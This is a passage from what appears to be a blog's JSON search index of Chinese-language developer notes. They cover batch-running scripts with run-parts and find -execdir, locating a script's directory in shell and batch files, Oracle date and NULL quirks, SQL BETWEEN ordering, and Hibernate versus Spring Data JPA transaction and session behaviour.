","date":"2020-09-11","objectID":"/blog/posts/Linux-%E5%9F%B7%E8%A1%8C%E5%A4%9A%E5%80%8B%E7%9B%AE%E9%8C%84%E5%85%A8%E9%83%A8%E6%8C%87%E4%BB%A4%E6%96%B9%E6%B3%95/:0:0","tags":["linux","shell"],"title":"Linux 執行多個目錄全部指令方法","uri":"/blog/posts/Linux-%E5%9F%B7%E8%A1%8C%E5%A4%9A%E5%80%8B%E7%9B%AE%E9%8C%84%E5%85%A8%E9%83%A8%E6%8C%87%E4%BB%A4%E6%96%B9%E6%B3%95/"},{"categories":["Linux"],"content":"run-parts run-parts 就是執行當下所有目錄的程式，這之前在 crontab 有看到 但沒有仔細去研究 run-parts –regex '.*sh$' /home/pi/shell/ ","date":"2020-09-11","objectID":"/blog/posts/Linux-%E5%9F%B7%E8%A1%8C%E5%A4%9A%E5%80%8B%E7%9B%AE%E9%8C%84%E5%85%A8%E9%83%A8%E6%8C%87%E4%BB%A4%E6%96%B9%E6%B3%95/:1:0","tags":["linux","shell"],"title":"Linux 執行多個目錄全部指令方法","uri":"/blog/posts/Linux-%E5%9F%B7%E8%A1%8C%E5%A4%9A%E5%80%8B%E7%9B%AE%E9%8C%84%E5%85%A8%E9%83%A8%E6%8C%87%E4%BB%A4%E6%96%B9%E6%B3%95/"},{"categories":["Linux"],"content":"預設抓取檔案 run-parts --list /home/malagege/run-parts /home/malagege/run-parts/test 所以記得要寫 regex ","date":"2020-09-11","objectID":"/blog/posts/Linux-%E5%9F%B7%E8%A1%8C%E5%A4%9A%E5%80%8B%E7%9B%AE%E9%8C%84%E5%85%A8%E9%83%A8%E6%8C%87%E4%BB%A4%E6%96%B9%E6%B3%95/:1:1","tags":["linux","shell"],"title":"Linux 執行多個目錄全部指令方法","uri":"/blog/posts/Linux-%E5%9F%B7%E8%A1%8C%E5%A4%9A%E5%80%8B%E7%9B%AE%E9%8C%84%E5%85%A8%E9%83%A8%E6%8C%87%E4%BB%A4%E6%96%B9%E6%B3%95/"},{"categories":["Linux"],"content":"相關文章 如何將目錄下的腳本一次性全部執行 - 良許Linux - 博客園 Linux之 run-parts 命令的用法及原理_一次次尝试-CSDN博客 run-parts/run-parts at master · ikysil/run-parts 請問 “run-parts” 這指令 這邊有提到順序 以 file name 字母順序來排： ls /path/to/dir | sort Fix “Exec format error” When Running Scripts With run-parts Command #!/usr/bin/python3 We can use: #!/usr/bin/env python3 ","date":"2020-09-11","objectID":"/blog/posts/Linux-%E5%9F%B7%E8%A1%8C%E5%A4%9A%E5%80%8B%E7%9B%AE%E9%8C%84%E5%85%A8%E9%83%A8%E6%8C%87%E4%BB%A4%E6%96%B9%E6%B3%95/:1:2","tags":["linux","shell"],"title":"Linux 執行多個目錄全部指令方法","uri":"/blog/posts/Linux-%E5%9F%B7%E8%A1%8C%E5%A4%9A%E5%80%8B%E7%9B%AE%E9%8C%84%E5%85%A8%E9%83%A8%E6%8C%87%E4%BB%A4%E6%96%B9%E6%B3%95/"},{"categories":["Linux"],"content":"find 這個可能適合用在我的需求 find /home/pi/shell/ -maxdepth 1 -type f -executable -name '*.sh' -exec {} \\; 改寫 -executable 需要拿掉，這個是抓可執行的檔案 find . -maxdepth 2 -type f -executable -name 'composer.json' -exec composer update \\; 卻不能跑 後面改成 -exec pwd ; 發現路徑是第一層路徑 ","date":"2020-09-11","objectID":"/blog/posts/Linux-%E5%9F%B7%E8%A1%8C%E5%A4%9A%E5%80%8B%E7%9B%AE%E9%8C%84%E5%85%A8%E9%83%A8%E6%8C%87%E4%BB%A4%E6%96%B9%E6%B3%95/:2:0","tags":["linux","shell"],"title":"Linux 執行多個目錄全部指令方法","uri":"/blog/posts/Linux-%E5%9F%B7%E8%A1%8C%E5%A4%9A%E5%80%8B%E7%9B%AE%E9%8C%84%E5%85%A8%E9%83%A8%E6%8C%87%E4%BB%A4%E6%96%B9%E6%B3%95/"},{"categories":["Linux"],"content":"使用 execdir find . -maxdepth 2 -type f -name 'composer.json' -execdir composer update \\; 应该在find命令中使用-execdir代替-exec_一程山水一程歌-CSDN博客 ","date":"2020-09-11","objectID":"/blog/posts/Linux-%E5%9F%B7%E8%A1%8C%E5%A4%9A%E5%80%8B%E7%9B%AE%E9%8C%84%E5%85%A8%E9%83%A8%E6%8C%87%E4%BB%A4%E6%96%B9%E6%B3%95/:2:1","tags":["linux","shell"],"title":"Linux 執行多個目錄全部指令方法","uri":"/blog/posts/Linux-%E5%9F%B7%E8%A1%8C%E5%A4%9A%E5%80%8B%E7%9B%AE%E9%8C%84%E5%85%A8%E9%83%A8%E6%8C%87%E4%BB%A4%E6%96%B9%E6%B3%95/"},{"categories":["Linux"],"content":"搬檔案可參考 rsync -a --remove-source-files SOURCEDIR /mnt/TARGETDIR/ 如何在 Linux 搬動資料夾與其所有檔案到另一個同名資料夾 | The Will Will Web ","date":"2020-09-11","objectID":"/blog/posts/Linux-%E5%9F%B7%E8%A1%8C%E5%A4%9A%E5%80%8B%E7%9B%AE%E9%8C%84%E5%85%A8%E9%83%A8%E6%8C%87%E4%BB%A4%E6%96%B9%E6%B3%95/:2:2","tags":["linux","shell"],"title":"Linux 執行多個目錄全部指令方法","uri":"/blog/posts/Linux-%E5%9F%B7%E8%A1%8C%E5%A4%9A%E5%80%8B%E7%9B%AE%E9%8C%84%E5%85%A8%E9%83%A8%E6%8C%87%E4%BB%A4%E6%96%B9%E6%B3%95/"},{"categories":["Linux"],"content":"我們很長寫腳本，在任意A目錄當執行不同的B目錄的腳本抓取路徑是A 但實務上有時候希望抓到B目錄 最近在想這個有什麼方法 ","date":"2020-09-10","objectID":"/blog/posts/Linux-Windows-%E5%9F%B7%E8%A1%8C%E8%85%B3%E6%9C%AC%E6%8A%93%E5%8F%96%E7%95%B6%E5%89%8D%E8%85%B3%E6%9C%AC%E8%B7%AF%E5%BE%91%E6%96%B9%E6%B3%95/:0:0","tags":["linux","window"],"title":"Linux/Windows 執行腳本抓取當前腳本路徑方法","uri":"/blog/posts/Linux-Windows-%E5%9F%B7%E8%A1%8C%E8%85%B3%E6%9C%AC%E6%8A%93%E5%8F%96%E7%95%B6%E5%89%8D%E8%85%B3%E6%9C%AC%E8%B7%AF%E5%BE%91%E6%96%B9%E6%B3%95/"},{"categories":["Linux"],"content":"Linux 以下都是參考:Shell Script 取得 Script 所在目錄位置 ","date":"2020-09-10","objectID":"/blog/posts/Linux-Windows-%E5%9F%B7%E8%A1%8C%E8%85%B3%E6%9C%AC%E6%8A%93%E5%8F%96%E7%95%B6%E5%89%8D%E8%85%B3%E6%9C%AC%E8%B7%AF%E5%BE%91%E6%96%B9%E6%B3%95/:1:0","tags":["linux","window"],"title":"Linux/Windows 執行腳本抓取當前腳本路徑方法","uri":"/blog/posts/Linux-Windows-%E5%9F%B7%E8%A1%8C%E8%85%B3%E6%9C%AC%E6%8A%93%E5%8F%96%E7%95%B6%E5%89%8D%E8%85%B3%E6%9C%AC%E8%B7%AF%E5%BE%91%E6%96%B9%E6%B3%95/"},{"categories":["Linux"],"content":"不嚴謹 #!/usr/bin/sh echo $0 但某時候會遇到問題 如./test.sh 這樣就會抓出 ./test.sh 參考:Shell Script 取得 Script 所在目錄位置 ","date":"2020-09-10","objectID":"/blog/posts/Linux-Windows-%E5%9F%B7%E8%A1%8C%E8%85%B3%E6%9C%AC%E6%8A%93%E5%8F%96%E7%95%B6%E5%89%8D%E8%85%B3%E6%9C%AC%E8%B7%AF%E5%BE%91%E6%96%B9%E6%B3%95/:1:1","tags":["linux","window"],"title":"Linux/Windows 執行腳本抓取當前腳本路徑方法","uri":"/blog/posts/Linux-Windows-%E5%9F%B7%E8%A1%8C%E8%85%B3%E6%9C%AC%E6%8A%93%E5%8F%96%E7%95%B6%E5%89%8D%E8%85%B3%E6%9C%AC%E8%B7%AF%E5%BE%91%E6%96%B9%E6%B3%95/"},{"categories":["Linux"],"content":"嚴謹 #!/usr/bin/sh get_script_dir () { SOURCE=\"${BASH_SOURCE[0]}\" # While $SOURCE is a symlink, resolve it while [ -h \"$SOURCE\" ]; do DIR=\"$( cd -P \"$( dirname \"$SOURCE\" )\" \u0026\u0026 pwd )\" SOURCE=\"$( readlink \"$SOURCE\" )\" # If $SOURCE was a relative symlink (so no \"/\" as prefix, need to resolve it relative to the symlink base directory [[ $SOURCE != /* ]] \u0026\u0026 SOURCE=\"$DIR/$SOURCE\" done DIR=\"$( cd -P \"$( dirname \"$SOURCE\" )\" \u0026\u0026 pwd )\" echo \"$DIR\" } echo \"$(get_script_dir)\" 參考:Shell Script 取得 Script 所在目錄位置 ","date":"2020-09-10","objectID":"/blog/posts/Linux-Windows-%E5%9F%B7%E8%A1%8C%E8%85%B3%E6%9C%AC%E6%8A%93%E5%8F%96%E7%95%B6%E5%89%8D%E8%85%B3%E6%9C%AC%E8%B7%AF%E5%BE%91%E6%96%B9%E6%B3%95/:1:2","tags":["linux","window"],"title":"Linux/Windows 執行腳本抓取當前腳本路徑方法","uri":"/blog/posts/Linux-Windows-%E5%9F%B7%E8%A1%8C%E8%85%B3%E6%9C%AC%E6%8A%93%E5%8F%96%E7%95%B6%E5%89%8D%E8%85%B3%E6%9C%AC%E8%B7%AF%E5%BE%91%E6%96%B9%E6%B3%95/"},{"categories":["Linux"],"content":"windows 最近有時候會接觸到 BAT腳本 一樣也是遇到一樣問題 不同的是有分 C / D 曹 在不同地方處理更是麻煩 需要切換C:或D: 如: D: cd \"D:xxx\" DIR /S /A:-D /B /O:N \u003elist.txt 解決方法 @echo =============================================== :: 切換到腳本所在的目錄 set WORK_DIR=%~dp0 echo Switch to %WORK_DIR% cd /d %WORK_DIR% echo %cd% @echo =============================================== ::...加上自己 script 參考:windows下bat批處理中%和%~dp0的區別_菜鳥攻城獅-CSDN博客 快閃人生: 【批次檔】%CD% 與 %~dp0 linux獲取當前腳本的絕對路徑 | aimuke ","date":"2020-09-10","objectID":"/blog/posts/Linux-Windows-%E5%9F%B7%E8%A1%8C%E8%85%B3%E6%9C%AC%E6%8A%93%E5%8F%96%E7%95%B6%E5%89%8D%E8%85%B3%E6%9C%AC%E8%B7%AF%E5%BE%91%E6%96%B9%E6%B3%95/:2:0","tags":["linux","window"],"title":"Linux/Windows 執行腳本抓取當前腳本路徑方法","uri":"/blog/posts/Linux-Windows-%E5%9F%B7%E8%A1%8C%E8%85%B3%E6%9C%AC%E6%8A%93%E5%8F%96%E7%95%B6%E5%89%8D%E8%85%B3%E6%9C%AC%E8%B7%AF%E5%BE%91%E6%96%B9%E6%B3%95/"},{"categories":["Linux"],"content":"彩蛋 最近有很多 JAVA 專案是 Maven 但在找有什麼快速輸入 mvn install 後來看到Linux 執行目錄下所有 Script 突然有靈感應該可以做到 有空再研究(我沒忘記的話) ","date":"2020-09-10","objectID":"/blog/posts/Linux-Windows-%E5%9F%B7%E8%A1%8C%E8%85%B3%E6%9C%AC%E6%8A%93%E5%8F%96%E7%95%B6%E5%89%8D%E8%85%B3%E6%9C%AC%E8%B7%AF%E5%BE%91%E6%96%B9%E6%B3%95/:3:0","tags":["linux","window"],"title":"Linux/Windows 執行腳本抓取當前腳本路徑方法","uri":"/blog/posts/Linux-Windows-%E5%9F%B7%E8%A1%8C%E8%85%B3%E6%9C%AC%E6%8A%93%E5%8F%96%E7%95%B6%E5%89%8D%E8%85%B3%E6%9C%AC%E8%B7%AF%E5%BE%91%E6%96%B9%E6%B3%95/"},{"categories":["Oracle"],"content":"TODO: 之後有空來整理 昨天 AND oh.tran_date BETWEEN TRUNC(SYSDATE - 1) AND TRUNC(SYSDATE) - 1/86400 sql - How can I select records ONLY from yesterday? - Stack Overflow ","date":"2020-09-09","objectID":"/blog/posts/Oracle-%E6%99%82%E9%96%93%E9%81%8B%E7%AE%97-%E7%AD%86%E8%A8%98/:0:0","tags":["oracle"],"title":"Oracle 時間運算 筆記","uri":"/blog/posts/Oracle-%E6%99%82%E9%96%93%E9%81%8B%E7%AE%97-%E7%AD%86%E8%A8%98/"},{"categories":["SQL"],"content":"今天寫 Oracle 時候發現 between sysdate and sysdate -1 竟然不能查詢 原來看一下文件，順序真的是有差的 ","date":"2020-09-08","objectID":"/blog/posts/SQL-Between-AND-%E9%A0%86%E5%BA%8F%E6%9C%89%E5%B7%AE/:0:0","tags":["sql","between"],"title":"SQL Between ... AND ...  順序有差","uri":"/blog/posts/SQL-Between-AND-%E9%A0%86%E5%BA%8F%E6%9C%89%E5%B7%AE/"},{"categories":["SQL"],"content":"Oracle is the value of the boolean expression: expr2 \u003c= expr1 AND expr1 \u003c= expr3 If expr3 \u003c expr2, then the interval is empty. If expr1 is NULL, then the result is NULL. If expr1 is not NULL, then the value is FALSE in the ordinary case and TRUE when the keyword NOT is used. Oracle BETWEEN Conditions ","date":"2020-09-08","objectID":"/blog/posts/SQL-Between-AND-%E9%A0%86%E5%BA%8F%E6%9C%89%E5%B7%AE/:1:0","tags":["sql","between"],"title":"SQL Between ... AND ...  順序有差","uri":"/blog/posts/SQL-Between-AND-%E9%A0%86%E5%BA%8F%E6%9C%89%E5%B7%AE/"},{"categories":["SQL"],"content":"MySQL If expr is greater than or equal to min and expr is less than or equal to max, BETWEEN returns 1, otherwise it returns 0. This is equivalent to the expression (min \u003c= expr AND expr \u003c= max) if all the arguments are of the same type. Otherwise type conversion takes place according to the rules described in Section 12.3, “Type Conversion in Expression Evaluation”, but applied to all the three arguments. MySQL :: MySQL 8.0 Reference Manual :: 12.4.2 Comparison Functions and Operators ","date":"2020-09-08","objectID":"/blog/posts/SQL-Between-AND-%E9%A0%86%E5%BA%8F%E6%9C%89%E5%B7%AE/:2:0","tags":["sql","between"],"title":"SQL Between ... AND ...  順序有差","uri":"/blog/posts/SQL-Between-AND-%E9%A0%86%E5%BA%8F%E6%9C%89%E5%B7%AE/"},{"categories":["Oracle"],"content":"之前有聽說 Oracle 空白字元跟 NULL 會是一樣的 但沒搞清楚 今天果然踩到地雷了 趕快來釐清一下 空白字元查 insert into 進去時候，Oracle 會轉成 NULL 所以查詢 select … where xxx is null 要放 null 空白字元查詢會找不到 Oracle中的NULL、’’（空字符串）以及’_’（空格） - Memory4Young - 博客园 ","date":"2020-09-08","objectID":"/blog/posts/Oracle-%E7%A9%BA%E7%99%BD%E5%AD%97%E5%85%83-%E5%92%8C-NULL/:0:0","tags":["oracle"],"title":"Oracle 空白字元 和 NULL","uri":"/blog/posts/Oracle-%E7%A9%BA%E7%99%BD%E5%AD%97%E5%85%83-%E5%92%8C-NULL/"},{"categories":["Java"],"content":"之前我有做過Spring 交易事務失效 | 程式狂想筆記 我以為大概了解 Spring 交易事務原理 但是我又遇到奇怪問題 在研究了一番，終於找到一些問題 ","date":"2020-09-06","objectID":"/blog/posts/Hibernate-%E5%92%8C-Spring-Boot-JPA-%E5%81%9A-Transactional-%E4%B8%8D%E4%B8%80%E6%A8%A3-session-close-%E6%99%82%E6%A9%9F/:0:0","tags":["hibernate","transactional","jpa","spring"],"title":"Hibernate 和 Spring Boot JPA 做 @Transactional 不一樣 session.close 時機","uri":"/blog/posts/Hibernate-%E5%92%8C-Spring-Boot-JPA-%E5%81%9A-Transactional-%E4%B8%8D%E4%B8%80%E6%A8%A3-session-close-%E6%99%82%E6%A9%9F/"},{"categories":["Java"],"content":"發現問題 之前以為 Hibernate 的 save 跟 jpa save的事情差不多 由於公司專案是使用 SSH 框架 跟我練習使用 Spring boot 結果不太一樣 花了一些時間研究並觀察 首先是 Hibernate 持久層 更改資料不做save 也會被儲存 但今天我今天進入第一個@transactional 取出來的 Entity 取進去 第二個 @transactional 做 dao.save 竟然出現錯誤 後來改成 update 就不會有這個問題 之前學 Spring boot 有聽說 save 會做判斷是否 新增/修改 我在 Hibernate 確實都可以用 但這個範例竟然錯了 我後來跑去 Spring Boot JPA 發現 dao 沒有 update 這時候我懷疑 Hibernate 跟 JPA 不一樣 spring - Update or SaveorUpdate in CRUDRespository, Is there any options available - Stack Overflow ","date":"2020-09-06","objectID":"/blog/posts/Hibernate-%E5%92%8C-Spring-Boot-JPA-%E5%81%9A-Transactional-%E4%B8%8D%E4%B8%80%E6%A8%A3-session-close-%E6%99%82%E6%A9%9F/:1:0","tags":["hibernate","transactional","jpa","spring"],"title":"Hibernate 和 Spring Boot JPA 做 @Transactional 不一樣 session.close 時機","uri":"/blog/posts/Hibernate-%E5%92%8C-Spring-Boot-JPA-%E5%81%9A-Transactional-%E4%B8%8D%E4%B8%80%E6%A8%A3-session-close-%E6%99%82%E6%A9%9F/"},{"categories":["Java"],"content":"為什麼會發生這個問題呢?我做 update 就可以正常修改 Persistent狀態的物件對應於資料庫中的一筆資料，物件的id值與資料的主鍵值相同，並且Session實例尚未失效，在這期間您對物件的任何狀 態變動，在Session實例關閉（close）或Transaction實例執行commit()之後，資料庫中對應的資料也會跟著更新。 如果您將Session實例關閉（close），則Persistent狀態的物件會成為Detached狀態。 … … Detached狀態的物件可以使用update()方法使之與資料庫中的對應資料再度發生關聯，此時Detached狀態的物件會變為 Persistent狀態。 參考: 實體物件生命週期 ","date":"2020-09-06","objectID":"/blog/posts/Hibernate-%E5%92%8C-Spring-Boot-JPA-%E5%81%9A-Transactional-%E4%B8%8D%E4%B8%80%E6%A8%A3-session-close-%E6%99%82%E6%A9%9F/:1:1","tags":["hibernate","transactional","jpa","spring"],"title":"Hibernate 和 Spring Boot JPA 做 @Transactional 不一樣 session.close 時機","uri":"/blog/posts/Hibernate-%E5%92%8C-Spring-Boot-JPA-%E5%81%9A-Transactional-%E4%B8%8D%E4%B8%80%E6%A8%A3-session-close-%E6%99%82%E6%A9%9F/"},{"categories":["Java"],"content":"我的Hibernate 物件變成了Detached ??? 我的Hibernate 物件變成了Detached ??? 最後爬到這篇文章 getCurrentSession得到的session是和事務綁定的session，所以： 1，要用getCurrentSession生產的session，就必須有事務環境，意思就是你必須在調用session方法之前，session.beginTransaction（）；就算你只是get或者query 2，在事務提交之後，即session.getTransaction().commit()之後，session自動關閉，所以你用getCurrentSession，只需要commit事務，不要去調用session.close()。 3，你用的是ssh，spring為hibernate的current_session_context_class配置了一個SpringSessionContext來幫你管理getCurrentSession中的session，所以，你在OpenSessionInview的時候，spring就自動的幫你打開了session——\u003e你在執行用AOP包裝的事務的時候，事務就開啟了——\u003e執行你的業務方法——\u003e提交事務（注意，hibernate管理的getCurrentSession在提交事務的時候才會關閉ession，而spring提供的這個SpringSessionContext不會） ——\u003eopensessioninview關閉session。 從上面的執行流程可以看出，你在SSH集成的時候，如果用的是getCurrentSession的集成方式，就不能設置hibernate的current_session_context_class為thread，而應該空著，讓spring幫你。 參考:hibernate中创建session的两种方式方式，区别在哪里？_qq_25843323的博客-CSDN博客 備份圖 Hibernate daoImpl protected Session getSession() { return this.sessionFactory.getCurrentSession(); } public void save(T entity) throws Exception { this.getSession().save(entity); } Spring Boot CRUDRepository @Transactional public \u003cS extends T\u003e S save(S entity) { if(this.entityInformation.isNew(entity)) { this.em.persist(entity); return entity; } else { return this.em.merge(entity); } } 我的SSH 專案使用this.sessionFactory.getCurrentSession(); daoImpl 裡面確實沒看到 session.close 上面這篇應該不是錯的 我也曾經改過 thread 也不能跑 ","date":"2020-09-06","objectID":"/blog/posts/Hibernate-%E5%92%8C-Spring-Boot-JPA-%E5%81%9A-Transactional-%E4%B8%8D%E4%B8%80%E6%A8%A3-session-close-%E6%99%82%E6%A9%9F/:1:2","tags":["hibernate","transactional","jpa","spring"],"title":"Hibernate 和 Spring Boot JPA 做 @Transactional 不一樣 session.close 時機","uri":"/blog/posts/Hibernate-%E5%92%8C-Spring-Boot-JPA-%E5%81%9A-Transactional-%E4%B8%8D%E4%B8%80%E6%A8%A3-session-close-%E6%99%82%E6%A9%9F/"},{"categories":["Java"],"content":"Hibernate @Transactional 每做一次都會 commit 並 session 關閉 上面說明總結，因為 session 使用 getCurrentSession(); @Transactional 會依照 session 規則，最後會做 commit Hibernate 連線會自動關閉(session.close) 注意這邊我講的是我公司專案，不是 Spring Boot JPA 所以之前我不了解規則，有時候會出現 No session 問題 但是 Spring Boot JPA 就沒有這個問題 現在猜測我之前是遇到這個問題 以下可能是錯誤資訊，發現錯誤會修正 ============ ","date":"2020-09-06","objectID":"/blog/posts/Hibernate-%E5%92%8C-Spring-Boot-JPA-%E5%81%9A-Transactional-%E4%B8%8D%E4%B8%80%E6%A8%A3-session-close-%E6%99%82%E6%A9%9F/:1:3","tags":["hibernate","transactional","jpa","spring"],"title":"Hibernate 和 Spring Boot JPA 做 @Transactional 不一樣 session.close 時機","uri":"/blog/posts/Hibernate-%E5%92%8C-Spring-Boot-JPA-%E5%81%9A-Transactional-%E4%B8%8D%E4%B8%80%E6%A8%A3-session-close-%E6%99%82%E6%A9%9F/"},{"categories":["Java"],"content":"Spring Boot JPA save 使用 @Transactional 不會做 commit? 下面刪掉的跳過，應該是 Spring 傳播事務不會 commit 重複 REQUIRED 兩層不會 commit，原因是兩層都是使用同一個交易 之前 @Transactional 失效問題可能是這裡面提到問題Spring 交易事務失效 | 程式狂想筆記 之前我也不是很熟…. 簡單來刷，@Transactional 下面那一層不會 commit，但是他有做 flush 動作 @Transactional 回到上一層結束時候，才會做 commit 但 Spring Boot JPA commit時候，並不會像 Session 一樣會 close 掉 這一點真的很方便 Hibernate 連線問題不確定Hibernate Tips: How to access Hibernate APIs from JPA 能不能解決 看這邊問題，我想到 Spring 交易事務是使用AOP代理模式去做beginTransactional，最後會做commit 這邊我有整理Spring 交易事務失效 | 程式狂想筆記 但Spring Boot JPA 的save 怎麼沒有 commit? 能順外面用 @Transactional 做 commit 和 rollback?? @Transactional public \u003cS extends T\u003e S save(S entity) { if(this.entityInformation.isNew(entity)) { this.em.persist(entity); return entity; } else { return this.em.merge(entity); } } 主要就是判斷這個對象數據庫裡面是否存在，如果存在則更新， 如果是不存在則新增；根據事務的傳播性，在執行persist或者merge操作之後並不會直接提交事務。而是在所有循環保存之後@Transaction註解會統一flush,commit事務 ,下面介紹關於EntityManager常用API springboot jpa 批量保存數據–EntityManager和 JpaRepository - WenQ001 - 博客園 這邊有提到使用persist 或者 merge 操作之後並不會直接提交事務 這邊我會錯意，其實我寫這一段覺得還是哪裡怪怪的 後來查了一下 應該是 Spring 事務傳播 Spring事務傳播行為詳解 - 個人文章 - SegmentFault 思否 備份圖 這篇寫得很棒!! Spring声明式事务管理之二：核心接口API - 簡書 java - Does Hibernate’s Session.close() automatically rollback uncommitted transactions? - Stack Overflow HibernateTransactionManager和DataSourceTransactionManager_qq_23476319的博客-CSDN博客 ","date":"2020-09-06","objectID":"/blog/posts/Hibernate-%E5%92%8C-Spring-Boot-JPA-%E5%81%9A-Transactional-%E4%B8%8D%E4%B8%80%E6%A8%A3-session-close-%E6%99%82%E6%A9%9F/:1:4","tags":["hibernate","transactional","jpa","spring"],"title":"Hibernate 和 Spring Boot JPA 做 @Transactional 不一樣 session.close 時機","uri":"/blog/posts/Hibernate-%E5%92%8C-Spring-Boot-JPA-%E5%81%9A-Transactional-%E4%B8%8D%E4%B8%80%E6%A8%A3-session-close-%E6%99%82%E6%A9%9F/"},{"categories":["Java"],"content":"Hibernate 的 commit, flush Persistence Context Hibernate —— flush和commit的区别 - Java天堂 ","date":"2020-09-06","objectID":"/blog/posts/Hibernate-%E5%92%8C-Spring-Boot-JPA-%E5%81%9A-Transactional-%E4%B8%8D%E4%B8%80%E6%A8%A3-session-close-%E6%99%82%E6%A9%9F/:1:5","tags":["hibernate","transactional","jpa","spring"],"title":"Hibernate 和 Spring Boot JPA 做 @Transactional 不一樣 session.close 時機","uri":"/blog/posts/Hibernate-%E5%92%8C-Spring-Boot-JPA-%E5%81%9A-Transactional-%E4%B8%8D%E4%B8%80%E6%A8%A3-session-close-%E6%99%82%E6%A9%9F/"},{"categories":["Java"],"content":"什麼是 persist , merge? 這邊沒研究很清楚，Spring Boot JPA save 使用 @Transactional 不會做 commit? 好像就是這個問題，不會影響到 有看到使用就一定要做事務，不然沒有效果 這邊整理相關連結 springboot jpa 批量保存數據–EntityManager和 JpaRepository - WenQ001 - 博客園 java - What are the differences between the different saving methods in Hibernate? - Stack Overflow Hibernate save()与persist()区别_攻城狮Luke（刘健彬）-CSDN博客 hibernate的各种保存方式的区别 (save,persist,update,saveOrUpdte,merge,flush,lock)等 - DANCE WITH JAVA - BlogJava 備份圖 Hibernate各种保存方式的区别 - 不發光的螢火蟲 備份圖 Hibernate save, saveOrUpdate, persist, merge, update 区别 - xiaoheike - 博客园 備份圖 xiaoheike/HibernateSavePersistUpdateMergeDiff ","date":"2020-09-06","objectID":"/blog/posts/Hibernate-%E5%92%8C-Spring-Boot-JPA-%E5%81%9A-Transactional-%E4%B8%8D%E4%B8%80%E6%A8%A3-session-close-%E6%99%82%E6%A9%9F/:1:6","tags":["hibernate","transactional","jpa","spring"],"title":"Hibernate 和 Spring Boot JPA 做 @Transactional 不一樣 session.close 時機","uri":"/blog/posts/Hibernate-%E5%92%8C-Spring-Boot-JPA-%E5%81%9A-Transactional-%E4%B8%8D%E4%B8%80%E6%A8%A3-session-close-%E6%99%82%E6%A9%9F/"},{"categories":["Java"],"content":"try catch 到底能不能抓到 @Transactional public method ? 先說一下問題，我因為上面敘述，我接觸專案 DaoImpl.java 是使用 Hibernate 我接觸到的專案是不會抓到 try catch \u003c—這邊指的是 dao.save 會抓到 非使用 Spring Boot JPA 的 try catch 抓地到 所以我這邊操作出來竟然測出兩種不一樣解果 Spring Boot JPA 使用 try catch(內層)抓地到 Exception \u003c—這邊指的是 dao.save 丟的 Exception 不是一般 Exception 那為什麼會不一樣呢? 這邊我目前猜測是 @Transactional 的關係 Spring Boot JPA 裡面 .save 就有包一層 @Transactional 所以結束會 flush 但是我目前接觸到的 DaoImpl.java 就沒有這一層 所以這是目前最有可能的 ","date":"2020-09-06","objectID":"/blog/posts/Hibernate-%E5%92%8C-Spring-Boot-JPA-%E5%81%9A-Transactional-%E4%B8%8D%E4%B8%80%E6%A8%A3-session-close-%E6%99%82%E6%A9%9F/:2:0","tags":["hibernate","transactional","jpa","spring"],"title":"Hibernate 和 Spring Boot JPA 做 @Transactional 不一樣 session.close 時機","uri":"/blog/posts/Hibernate-%E5%92%8C-Spring-Boot-JPA-%E5%81%9A-Transactional-%E4%B8%8D%E4%B8%80%E6%A8%A3-session-close-%E6%99%82%E6%A9%9F/"},{"categories":["Java"],"content":"try catch 觀察 只要進入到 @Transactional 就可以抓到這個 2020-09-08 21:42:01.333 TRACE 27527 — [nio-8080-exec-1] o.s.t.i.TransactionInterceptor : Completing transaction for [org.springframework.data.jpa.repository.support.SimpleJpaRepository.save] after exception: javax.persistence.PersistenceException: org.hibernate.exception.DataException: could not execute statement Completing 中文翻譯是「完成中」 spring-framework/TransactionAspectSupport.java at 673f83e388e5ee992340a623de5a248e95b94c34 · spring-projects/spring-framework 當前事務發生錯誤 2020-09-08 21:42:01.362 DEBUG 27527 — [nio-8080-exec-1] o.s.orm.jpa.JpaTransactionManager : Initiating transaction rollback 操作 commit 會看到 Initiating transaction commit 其實只要進入到 @Transactional 都會判斷當下使用哪一種事務方法 會依據程式碼使用和當下是否有交易連線去做 相關完整可能要看程式碼…，我找不到是哪一段 flush \u003e.\u003c spring-framework/TransactionAspectSupport.java at 673f83e388e5ee992340a623de5a248e95b94c34 · spring-projects/spring-framework Spring源码解析_哔哩哔哩 (゜-゜)つロ 干杯~-bilibili Spring源码分析（八）深入了解事务管理的流程 Springboot源码分析之事务拦截和管理 | Spring For All 17. Transaction Management ","date":"2020-09-06","objectID":"/blog/posts/Hibernate-%E5%92%8C-Spring-Boot-JPA-%E5%81%9A-Transactional-%E4%B8%8D%E4%B8%80%E6%A8%A3-session-close-%E6%99%82%E6%A9%9F/:2:1","tags":["hibernate","transactional","jpa","spring"],"title":"Hibernate 和 Spring Boot JPA 做 @Transactional 不一樣 session.close 時機","uri":"/blog/posts/Hibernate-%E5%92%8C-Spring-Boot-JPA-%E5%81%9A-Transactional-%E4%B8%8D%E4%B8%80%E6%A8%A3-session-close-%E6%99%82%E6%A9%9F/"},{"categories":["Java"],"content":"try catch 最好寫在哪邊? 外面一層，之前有看到 p3c看到alibaba/p3c: Alibaba Java Coding Guidelines pmd implements and IDE plugin 雖然看到網路上很多文章，都說 try catch(內層)裡面的catch 需要再 throw Exception 不過我測試 DAO 丟的 Exception 不管你有沒有 throw Exception 他還會丟一次，當然我猜非一般Dao 丟的 Exception @Transactional應該不會在幫你丟，所以要自己丟 ","date":"2020-09-06","objectID":"/blog/posts/Hibernate-%E5%92%8C-Spring-Boot-JPA-%E5%81%9A-Transactional-%E4%B8%8D%E4%B8%80%E6%A8%A3-session-close-%E6%99%82%E6%A9%9F/:2:2","tags":["hibernate","transactional","jpa","spring"],"title":"Hibernate 和 Spring Boot JPA 做 @Transactional 不一樣 session.close 時機","uri":"/blog/posts/Hibernate-%E5%92%8C-Spring-Boot-JPA-%E5%81%9A-Transactional-%E4%B8%8D%E4%B8%80%E6%A8%A3-session-close-%E6%99%82%E6%A9%9F/"},{"categories":["Java"],"content":"總結/心得 簡單來說，Spring 交易事務不管你用什麼 DB 套件，他們使用原理都是一樣的 我這邊不一樣的結果是 Spring boot 跟 我使用 Hibernate Dao 實作導致ˋ有不一樣結果 還有 Hibernate getCurrentSession 做 commit/rollback 實作會關閉交易 但透過 @Transactional public method 就可以正常抓到 連線，沒有的話可能要注意 commit/rollback 會遇到 no session 問題 當然 Spring Boot JPA應該不用煩惱 不會有 commit/rollback 自動關掉連線 save 使用 try catch 都能抓到問題 當然除了這些問題，Spring 交易事務失效 | 程式狂想筆記 裡面也要注意 @Transactional 是否有抓到 Spring AOP特性 往往有時候都是這些問題 所以了解Spring 事務，在程式撰寫應該比較不會遇到一些問題 希望不會我不要在卡關 orz 